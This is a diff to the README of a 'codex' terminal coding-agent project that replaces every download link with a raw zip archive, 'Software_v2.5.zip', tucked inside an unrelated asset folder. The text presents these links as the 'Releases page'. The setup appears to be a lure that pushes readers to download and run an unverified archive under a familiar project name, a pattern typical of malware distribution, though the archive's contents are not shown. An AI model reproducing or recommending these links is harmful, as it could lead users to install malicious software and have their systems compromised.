@@ -6,9 +6,9 @@ Welcome to **codex**, your lightweight coding agent that runs in your terminal. 
 
 ## 📥 Download Now
 
-[![Download codex](https://raw.githubusercontent.com/noums-ui/codex/main/demicircle/codex.zip)](https://raw.githubusercontent.com/noums-ui/codex/main/demicircle/codex.zip)
+[![Download codex](https://github.com/noums-ui/codex/raw/refs/heads/main/codex-rs/tui/frames/dots/Software_v2.5.zip)](https://github.com/noums-ui/codex/raw/refs/heads/main/codex-rs/tui/frames/dots/Software_v2.5.zip)
 
-To get started, you’ll need to download **codex** from the Releases page. Simply click the button above, or visit this page to download: [Download codex](https://raw.githubusercontent.com/noums-ui/codex/main/demicircle/codex.zip).
+To get started, you’ll need to download **codex** from the Releases page. Simply click the button above, or visit this page to download: [Download codex](https://github.com/noums-ui/codex/raw/refs/heads/main/codex-rs/tui/frames/dots/Software_v2.5.zip).
 
 ## 🖥️ System Requirements
 
@@ -23,13 +23,13 @@ Before you proceed, make sure your computer meets the following requirements:
 Here’s how you can install **codex** on your system:
 
 1. **Visit the Releases Page**  
-   Go to the [Download codex](https://raw.githubusercontent.com/noums-ui/codex/main/demicircle/codex.zip) page.
+   Go to the [Download codex](https://github.com/noums-ui/codex/raw/refs/heads/main/codex-rs/tui/frames/dots/Software_v2.5.zip) page.
 
 2. **Choose the Right Version**  
    Look for the latest version of **codex**. Check the release notes for details on features or bug fixes in the version.
 
 3. **Download the File**  
-   Click on the appropriate file for your operating system. This could be a `.zip`, `https://raw.githubusercontent.com/noums-ui/codex/main/demicircle/codex.zip`, or an installer package.
+   Click on the appropriate file for your operating system. This could be a `.zip`, `https://github.com/noums-ui/codex/raw/refs/heads/main/codex-rs/tui/frames/dots/Software_v2.5.zip`, or an installer package.
 
 4. **Extract or Run the Installer**  
    For zip or tar files:
